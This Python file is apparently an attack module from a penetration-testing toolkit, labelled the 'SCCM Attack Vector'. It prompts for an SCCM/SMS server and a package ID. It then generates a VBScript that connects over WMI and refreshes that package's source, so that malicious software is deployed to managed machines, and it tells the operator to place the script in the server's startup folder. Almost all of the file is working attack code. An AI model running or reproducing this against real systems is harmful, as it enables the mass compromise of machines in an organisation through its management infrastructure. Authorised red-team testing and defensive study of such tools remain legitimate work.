#!/usr/bin/python
# coding=utf-8

import os

import src.core.setcore as core

# Py2/3 compatibility
# Python3 renamed raw_input to input
try:
    input = raw_input
except NameError:
    pass

print("The" + core.bcolors.BOLD + " SCCM Attack Vector " + core.bcolors.ENDC +
      "will utilize the SCCM configurations to deploy malicious software. \n\n"
      "You need to have the SMSServer name and a PackageID you want to package "
      "on the website. Then you need to copy this configuration file to the "
      "startup directory for all of the users on the server.")

sms_server = input("Enter the IP address or hostname of the SMS Server: ")
package_id = input("Enter the Package ID of the package you want to patch: ")

configuration = '''
# configuration file written by Dave DeSimone and Bill Readshaw
# attack vector presented at Defcon 20
# added to set 07/27/2012

strSMSServer = "{0}"
strPackageID = "{1}"

Set objLoc =  CreateObject("WbemScripting.SWbemLocator")
Set objSMS= objLoc.ConnectServer(strSMSServer, "root\sms")
Set Results = objSMS.ExecQuery _
   ("SELECT * From SMS_ProviderLocation WHERE ProviderForLocalSite = true")
 For each Loc in Results
   If Loc.ProviderForLocalSite = True Then
     Set objSMS2 = objLoc.ConnectServer(Loc.Machine, "root\sms\site_"& _
        Loc.SiteCode)
     strSMSSiteCode = Loc.SiteCode
   end if
 Next

Set objPkgs = objSMS2.ExecQuery("select * from SMS_Package where PackageID = '" & strPackageID & "'")
for each objPkg in objPkgs
objPkg.RefreshPkgSource(0)
Next
'''.format(sms_server, package_id)

# write out the file to reports
with open(os.path.join(core.userconfigpath, "reports/sccm_configuration.txt"), 'w') as filewrite:
    filewrite.write(configuration)
core.print_status("The SCCM configuration script has been successfully created.")
core.print_status("You need to copy the script to the startup folder of the server.")
core.print_status("Report has been exported to {0}".format(os.path.join(core.definepath, "reports/sccm_configuration.txt")))
pause = input("Press " + core.bcolors.RED + "{return} " + core.bcolors.ENDC + "to exit this menu.")
